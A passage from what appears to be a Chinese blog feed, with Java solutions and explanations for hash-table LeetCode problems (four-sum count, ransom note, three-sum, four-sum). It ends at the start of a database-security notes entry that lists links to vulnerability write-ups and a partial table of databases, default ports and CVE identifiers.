&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到在temp1中的下标</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;nums.length;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp1[k] == nums[m])&#123;</span><br><span class="line">                res[<span class="number">0</span>] = k;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp1[i] == nums[n] &amp;&amp; i != k)&#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第454题-四数相加II"><a href="#第454题-四数相加II" class="headerlink" title="第454题.四数相加II"></a>第454题.四数相加II</h2><p>给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有多少个元组 (i, j, k, l) 能满足：<br>0 &lt;&#x3D; i, j, k, l &lt; n<br>nums1[i] + nums2[j] + nums3[k] + nums4[l] &#x3D;&#x3D; 0</p><p>示例 1：</p><blockquote><p>输入：nums1 &#x3D; [1,2], nums2 &#x3D; [-2,-1], nums3 &#x3D; [-1,2], nums4 &#x3D; [0,2]<br>输出：2<br>解释：<br>两个元组如下：</p><ol><li>(0, 0, 0, 1) -&gt; nums1[0] + nums2[0] + nums3[0] + nums4[1] &#x3D; 1 + (-2) + (-1) + 2 &#x3D; 0</li><li>(1, 1, 0, 0) -&gt; nums1[1] + nums2[1] + nums3[0] + nums4[0] &#x3D; 2 + (-1) + (-1) + 0 &#x3D; 0</li></ol></blockquote><p>示例 2：</p><blockquote><p>输入：nums1 &#x3D; [0], nums2 &#x3D; [0], nums3 &#x3D; [0], nums4 &#x3D; [0]<br>输出：1</p></blockquote><p>主要想法是把四个数组两两划分，计算和以及出现的次数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="comment">// 统计两个数组中的元素之和，同时统计出现的次数，放入map</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j : nums2)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> i + j;</span><br><span class="line">                map.put(sum, map.getOrDefault(sum, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 统计剩余的两个元素的和，在map中是否存在相加为0的情况，同时统计次数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums3)&#123;</span><br><span class="line">            <span class="keyword">for</span>( <span class="type">int</span> j : nums4)&#123;</span><br><span class="line">                res += map.getOrDefault(<span class="number">0</span>-i-j, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂度分析<br>时间复杂度：O(n2)。我们使用了两次二重循环，时间复杂度均为 O(n2)。在循环中对哈希映射进行的修改以及查询操作的期望时间复杂度均为 O(1)，因此总时间复杂度为 O(n2)。<br>空间复杂度：O(n2)，即为哈希映射需要使用的空间。在最坏的情况下，<code>A[i]+B[j]</code> 的值均不相同，因此值的个数为 n2，也就需要 O(n2) 的空间。</p><h2 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383. 赎金信"></a>383. 赎金信</h2><p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。<br>如果可以，返回 true ；否则返回 false 。<br>magazine 中的每个字符只能在 ransomNote 中使用一次。</p><p>示例 1：<br>输入：ransomNote &#x3D; “a”, magazine &#x3D; “b”<br>输出：false</p><p>示例 2：<br>输入：ransomNote &#x3D; “aa”, magazine &#x3D; “ab”<br>输出：false</p><p>示例 3：<br>输入：ransomNote &#x3D; “aa”, magazine &#x3D; “aab”<br>输出：true</p><p>其实主要还是用哈希表记录有哪些，然后需要哪些，减去之后再检查哈希表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConstruct</span><span class="params">(String ransomNote, String magazine)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(ransomNote.length() &gt; magazine.length())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 定义一个哈希映射数组</span></span><br><span class="line">        <span class="type">int</span>[] record =  <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : magazine.toCharArray())&#123;</span><br><span class="line">            record[c - <span class="string">&#x27;a&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : ransomNote.toCharArray())&#123;</span><br><span class="line">            record[c - <span class="string">&#x27;a&#x27;</span>] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : record)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第15题-三数之和"><a href="#第15题-三数之和" class="headerlink" title="第15题. 三数之和"></a>第15题. 三数之和</h2><p>给你一个整数数组 nums ，判断是否存在三元组 <code>[nums[i], nums[j], nums[k]]</code> 满足 i !&#x3D; j、i !&#x3D; k 且 j !&#x3D; k ，同时还满足 <code>nums[i] + nums[j] + nums[k] == 0</code> 。请你返回所有和为 0 且不重复的三元组。<br>注意：答案中不可以包含重复的三元组。</p><p>拿这个nums数组来举例，首先将数组排序，然后有一层for循环，i从下标0的地方开始，同时定一个下标left 定义在i+1的位置上，定义下标right 在数组结尾的位置上。<br>依然还是在数组中找到 abc 使得a + b +c &#x3D;0，我们这里相当于 <code>a = nums[i]，b = nums[left]，c = nums[right]</code>。<br>接下来如何移动left 和right呢， 如果<code>nums[i] + nums[left] + nums[right] &gt; 0</code> 就说明 此时三数之和大了，因为数组是排序后了，所以right下标就应该向左移动，这样才能让三数之和小一些。<br>如果 <code>nums[i] + nums[left] + nums[right] &lt; 0</code> 说明 此时 三数之和小了，left 就向右移动，才能让三数之和大一些，直到left与right相遇为止。<br>时间复杂度：O(n^2)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用双指针法解决</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// 找出a + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(right &gt; left)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[left], nums[right]));</span><br><span class="line">                    <span class="comment">// 去重逻辑应该放在找到一个三元组之后对abc去重</span></span><br><span class="line">                    <span class="keyword">while</span>(right&gt;left &amp;&amp; nums[right] == nums[right-<span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span>(right&gt;left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                    right--;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用哈希集合解决</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// 找出a + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>])&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">            HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>; j&lt;nums.length;j++)&#123;</span><br><span class="line">                <span class="comment">//三元组元素b去重</span></span><br><span class="line">                <span class="keyword">if</span>(j&gt;i+<span class="number">2</span> &amp;&amp; nums[j] == nums[j-<span class="number">1</span>] &amp;&amp; nums[j-<span class="number">1</span>] == nums[j-<span class="number">2</span>]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> -nums[i] - nums[j];</span><br><span class="line">                <span class="keyword">if</span>(set.contains(c))&#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[j], c));</span><br><span class="line">                    set.remove(c); <span class="comment">//三元组元素c去重</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    set.add(nums[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第18题-四数之和"><a href="#第18题-四数之和" class="headerlink" title="第18题. 四数之和"></a>第18题. 四数之和</h2><p>题意：给定一个包含 n 个整数的数组 nums 和一个目标值 target，判断 nums 中是否存在四个元素 a，b，c 和 d ，使得 a + b + c + d 的值与 target 相等？找出所有满足条件且不重复的四元组。<br>注意：<br>答案中不可以包含重复的四元组。<br>示例： 给定数组 nums &#x3D; [1, 0, -1, 0, -2, 2]，和 target &#x3D; 0。 满足要求的四元组集合为： [ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2] ]</p><p>四数之和，和15.三数之和 (opens new window)是一个思路，都是使用双指针法, 基本解法就是在15.三数之和 (opens new window)的基础上再套一层for循环。<br>但是有一些细节需要注意，例如： 不要判断nums[k] &gt; target 就返回了，三数之和 可以通过 nums[i] &gt; 0 就返回了，因为 0 已经是确定的数了，四数之和这道题目 target是任意值。比如：数组是[-4, -3, -2, -1]，target是-10，不能因为-4 &gt; -10而跳过。但是我们依旧可以去做剪枝，逻辑变成nums[i] &gt; target &amp;&amp; (nums[i] &gt;&#x3D;0 || target &gt;&#x3D; 0)就可以了。<br>15.三数之和 (opens new window)的双指针解法是一层for循环num[i]为确定值，然后循环内有left和right下标作为双指针，找到nums[i] + nums[left] + nums[right] &#x3D;&#x3D; 0。<br>四数之和的双指针解法是两层for循环nums[k] + nums[i]为确定值，依然是循环内有left和right下标作为双指针，找出nums[k] + nums[i] + nums[left] + nums[right] &#x3D;&#x3D; target的情况，三数之和的时间复杂度是O(n^2)，四数之和的时间复杂度是O(n^3) 。<br>那么一样的道理，五数之和、六数之和等等都采用这种解法。<br>对于15.三数之和 (opens new window)双指针法就是将原本暴力O(n^3)的解法，降为O(n^2)的解法，四数之和的双指针解法就是将原本暴力O(n^4)的解法，降为O(n^3)的解法。<br>之前我们讲过哈希表的经典题目：454.四数相加II (opens new window)，相对于本题简单很多，因为本题是要求在一个集合中找出四个数相加等于target，同时四元组不能重复。<br>而454.四数相加II (opens new window)是四个独立的数组，只要找到A[i] + B[j] + C[k] + D[l] &#x3D; 0就可以，不用考虑有重复的四个元素相加等于0的情况，所以相对于本题还是简单了不少！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(nums); <span class="comment">// 排序数组</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); <span class="comment">// 结果集</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;k&lt;nums.length;k++)&#123;</span><br><span class="line">            <span class="comment">// 剪枝操作</span></span><br><span class="line">            <span class="keyword">if</span>(nums[k] &gt;target &amp;&amp; nums[k]&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对nums[k]去重</span></span><br><span class="line">            <span class="keyword">if</span>(k&gt;<span class="number">0</span> &amp;&amp; nums[k] == nums[k-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=k+<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">                <span class="comment">// 第二级剪枝</span></span><br><span class="line">                <span class="keyword">if</span>(nums[k] + nums[i]&gt;target&amp;&amp;nums[k]+nums[i]&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 对nums[i]去重</span></span><br><span class="line">                <span class="keyword">if</span>(i&gt;k+<span class="number">1</span> &amp;&amp; nums[i]==nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i+<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(right&gt;left)&#123;</span><br><span class="line">                    <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> (<span class="type">long</span>)nums[k]+nums[i]+nums[left]+nums[right];</span><br><span class="line">                    <span class="keyword">if</span>(sum&gt;target)&#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum&lt;target)&#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        result.add(Arrays.asList(nums[k], nums[i], nums[left], nums[right]));</span><br><span class="line">                        <span class="comment">// 对nums[left]和nums[left]去重</span></span><br><span class="line">                        <span class="keyword">while</span>(right&gt;left&amp;&amp;nums[right]==nums[right-<span class="number">1</span>])right--;</span><br><span class="line">                        <span class="keyword">while</span>(right&gt;left&amp;&amp; nums[left] ==nums[left+<span class="number">1</span>]) left++;</span><br><span class="line">                        right--;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在关于哈希表，你该了解这些！ (opens new window)中，我们介绍了哈希表的基础理论知识，不同于枯燥的讲解，这里介绍了都是对刷题有帮助的理论知识点。<br>一般来说哈希表都是用来快速判断一个元素是否出现集合里。<br>对于哈希表，要知道哈希函数和哈希碰撞在哈希表中的作用。<br>哈希函数是把传入的key映射到符号表的索引上。<br>哈希碰撞处理有多个key映射到相同索引上时的情景，处理碰撞的普遍方式是拉链法和线性探测法。<br>接下来是常见的三种哈希结构：</p><p>数组<br>set（集合）<br>map（映射）<br>在C++语言中，set 和 map 都分别提供了三种数据结构，每种数据结构的底层实现和用途都有所不同，在关于哈希表，你该了解这些！ (opens new window)中我给出了详细分析，这一知识点很重要！<br>例如什么时候用std::set，什么时候用std::multiset，什么时候用std::unordered_set，都是很有考究的。<br>只有对这些数据结构的底层实现很熟悉，才能灵活使用，否则很容易写出效率低下的程序。</p><h3 id="哈希表经典题目"><a href="#哈希表经典题目" class="headerlink" title="哈希表经典题目"></a>哈希表经典题目</h3><h4 id="数组作为哈希表"><a href="#数组作为哈希表" class="headerlink" title="数组作为哈希表"></a>数组作为哈希表</h4><p>一些应用场景就是为数组量身定做的。</p><p>在242.有效的字母异位词 (opens new window)中，我们提到了数组就是简单的哈希表，但是数组的大小是受限的！<br>这道题目包含小写字母，那么使用数组来做哈希最合适不过。</p><p>在383.赎金信 (opens new window)中同样要求只有小写字母，那么就给我们浓浓的暗示，用数组！<br>本题和242.有效的字母异位词 (opens new window)很像，242.有效的字母异位词 (opens new window)是求 字符串a 和 字符串b 是否可以相互组成，在383.赎金信 (opens new window)中是求字符串a能否组成字符串b，而不用管字符串b 能不能组成字符串a。</p><p>一些同学可能想，用数组干啥，都用map不就完事了。<br>上面两道题目用map确实可以，但使用map的空间消耗要比数组大一些，因为map要维护红黑树或者符号表，而且还要做哈希函数的运算。所以数组更加简单直接有效！</p><h4 id="set作为哈希表"><a href="#set作为哈希表" class="headerlink" title="set作为哈希表"></a>set作为哈希表</h4><p>在349. 两个数组的交集 (opens new window)中我们给出了什么时候用数组就不行了，需要用set。<br>这道题目没有限制数值的大小，就无法使用数组来做哈希表了。<br>主要因为如下两点：<br>数组的大小是有限的，受到系统栈空间（不是数据结构的栈）的限制。<br>如果数组空间够大，但哈希值比较少、特别分散、跨度非常大，使用数组就造成空间的极大浪费。<br>所以此时一样的做映射的话，就可以使用set了。<br>关于set，C++ 给提供了如下三种可用的数据结构：（详情请看关于哈希表，你该了解这些！ (opens new window)）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::set</span><br><span class="line">std::multiset</span><br><span class="line">std::unordered_set</span><br></pre></td></tr></table></figure><p>std::set和std::multiset底层实现都是红黑树，std::unordered_set的底层实现是哈希， 使用unordered_set 读写效率是最高的，本题并不需要对数据进行排序，而且还不要让数据重复，所以选择unordered_set。<br>在202.快乐数 (opens new window)中，我们再次使用了unordered_set来判断一个数是否重复出现过。</p><h4 id="map作为哈希表"><a href="#map作为哈希表" class="headerlink" title="map作为哈希表"></a>map作为哈希表</h4><p>在1.两数之和 (opens new window)中map正式登场。<br>来说一说：使用数组和set来做哈希法的局限。<br>数组的大小是受限制的，而且如果元素很少，而哈希值太大会造成内存空间的浪费。<br>set是一个集合，里面放的元素只能是一个key，而两数之和这道题目，不仅要判断y是否存在而且还要记录y的下标位置，因为要返回x 和 y的下标。所以set 也不能用。<br>map是一种&lt;key, value&gt;的结构，本题可以用key保存数值，用value在保存数值所在的下标。所以使用map最为合适。</p><p>C++提供如下三种map：（详情请看关于哈希表，你该了解这些！ (opens new window)）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::map</span><br><span class="line">std::multimap</span><br><span class="line">std::unordered_map</span><br></pre></td></tr></table></figure><p>std::unordered_map 底层实现为哈希，std::map 和std::multimap 的底层实现是红黑树。<br>同理，std::map 和std::multimap 的key也是有序的（这个问题也经常作为面试题，考察对语言容器底层的理解），1.两数之和 (opens new window)中并不需要key有序，选择std::unordered_map 效率更高！<br>在454.四数相加 (opens new window)中我们提到了其实需要哈希的地方都能找到map的身影。<br>本题咋眼一看好像和18. 四数之和 (opens new window)，15.三数之和 (opens new window)差不多，其实差很多！<br>关键差别是本题为四个独立的数组，只要找到A[i] + B[j] + C[k] + D[l] &#x3D; 0就可以，不用考虑重复问题，而18. 四数之和 (opens new window)，15.三数之和 (opens new window)是一个数组（集合）里找到和为0的组合，可就难很多了！<br>用哈希法解决了两数之和，很多同学会感觉用哈希法也可以解决三数之和，四数之和。<br>其实是可以解决，但是非常麻烦，需要去重导致代码效率很低。<br>在15.三数之和 (opens new window)中我给出了哈希法和双指针两个解法，大家就可以体会到，使用哈希法还是比较麻烦的。<br>所以18. 四数之和，15.三数之和都推荐使用双指针法！</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 哈希 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】数据库安全笔记</title>
      <link href="/2024/09/30/WebSecurity/owasptop/database-security/"/>
      <url>/2024/09/30/WebSecurity/owasptop/database-security/</url>
      
        <content type="html"><![CDATA[<p>渗透测试 | Redis渗透 <a href="https://www.freebuf.com/articles/web/281161.html">https://www.freebuf.com/articles/web/281161.html</a><br>Redis-未授权访问-CVE-2022-0543 (redis沙盒逃逸) <a href="https://blog.csdn.net/MateSnake/article/details/138820548">https://blog.csdn.net/MateSnake/article/details/138820548</a><br>InfluxDB JWT未授权漏洞（CVE-2019-20933）复现 <a href="https://www.cnblogs.com/BMCel/p/18025462">https://www.cnblogs.com/BMCel/p/18025462</a><br>数据库安全：InfluxDB 未授权访问-Jwt验证不当 漏洞. <a href="https://blog.csdn.net/weixin_54977781/article/details/134346421">https://blog.csdn.net/weixin_54977781/article/details/134346421</a><br>H2database 未授权访问 vulhub  <a href="https://blog.csdn.net/c0529/article/details/139624113">https://blog.csdn.net/c0529/article/details/139624113</a><br>深入分析H2数据库控制台中无需身份验证的RCE漏洞 <a href="https://zhuanlan.zhihu.com/p/459941555">https://zhuanlan.zhihu.com/p/459941555</a></p><h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>首先整理出一个表格，方便参考：</p><table><thead><tr><th>#</th><th>数据库</th><th>简介</th><th>默认端口</th><th>特性</th><th>已知CVE漏洞</th></tr></thead><tbody><tr><td>1</td><td>Redis</td><td>开源的内存数据结构存储系统，用作数据库、缓存和消息代理。</td><td>6379</td><td>支持字符串、哈希、列表、集合等多种数据结构。</td><td>CVE-2022-0543、CVE-2023-36824、CVE-2023-28856</td></tr><tr><td>2</td><td>Hadoop</td><td>允许在计算机集群中分布式处理大数据集的框架。</td><td>50070 &#x2F; 50075 &#x2F; 50010</td><td>存储和处理大量数据的能力。</td><td>CVE-2016-5397, CVE-2017-15718</td></tr><tr><td>3</td><td>MySQL</td><td>开源关系数据库管理系统，以其可靠性和易用性著称。</td><td>3306</td><td>支持全文搜索、SSL支持、分区和复制等功能。</td><td>CVE-2012-2122</td></tr><tr><td>4</td><td>InfluxDB</td><td>专门设计用于处理高写入和查询负载的时间序列数据库。</td><td>8086 &#x2F; 8088</td><td>高效处理时间序列数据，支持SQL-like查询语言。</td><td>CVE-2019-20933</td></tr><tr><td>5</td><td>H2 Database</td><td>轻量级开源关系数据库，用Java编写，设计用于嵌入Java应用中。</td><td>8082 &#x2F; 9092</td><td>支持标准SQL和JDBC 